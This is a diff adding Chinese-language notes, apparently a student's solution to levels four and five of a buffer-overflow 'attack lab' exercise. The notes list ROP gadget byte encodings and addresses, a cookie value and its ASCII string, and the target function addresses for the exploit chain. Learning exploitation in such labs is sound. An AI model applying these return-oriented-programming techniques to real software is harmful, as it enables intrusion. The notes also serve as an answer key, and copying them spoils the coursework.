@@ -1,0 +1,45 @@
+第四关：
+
+(ret：0xc3  nop；0x90 啥都不做，只让程序计数器加一）
+
+
+缓冲区  40 bytes
+
+①gadget1:
+popq %rax       58 90 90 c3    0x4018be (90 90 没有影响)
+
+②cookie：0x2a328fb5
+
+③gadget2:
+movq %rax,%rdi  48 89 c7 (91) c3 0x4018b8
+
+④touch2地址：
+0x40172c
+
+
+
+
+第五关：
+
+栈顶
+
+缓冲区  40 bytes
+
+mov  %rsp, %rax 48 89 e0 c3    0x401926
+mov  %rax, %rdi 48 89 c7 c3    0x40188f
+pop  %rax       58 90 90 c3    0x4018b2
+
+constant 0x48
+
+movl %eax, %edx 89 c2 (20 c9) c3 0x401961 (20 c9 没有影响)
+movl %edx, %ecx 89 d1 (08 c9) c3 0x4018f1 (08 c9 没有影响)
+
+movl %ecx, %esi 89 ce c3       0x4018eb
+lea  (%rdi, %rsi, 1), %rax     0x4018c9
+mov  %rax, %rdi 48 89 c7 (91) c3 0x4018b8 (91 没有影响)
+
+touch3 的地址      0x401800
+cookie 的字符串    32 61 33 32 38 66 62 35
+(cookie：0x2a328fb5)
+
+栈底
